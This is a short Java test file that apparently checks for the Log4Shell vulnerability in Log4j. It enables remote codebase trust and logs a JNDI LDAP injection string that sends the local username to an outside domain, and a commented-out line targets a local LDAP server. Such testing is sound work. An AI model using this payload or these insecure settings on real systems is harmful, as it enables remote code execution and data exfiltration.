package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.net.JndiManager;

import javax.naming.NamingException;

public class TestLog4j {
    private static final Logger logger = LogManager.getLogger(TestLog4j.class);

    public static void main(String[] args) throws NamingException {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        logger.error("${jndi:ldap://${sys:user.name}.26f049c2fa.ipv6.1433.eu.org.}");
        logger.info("Hello World!");
//        JndiManager defaultManager = JndiManager.getDefaultManager();
//        defaultManager.lookup("ldap://127.0.0.1:1389/ovtofc");
    }

}
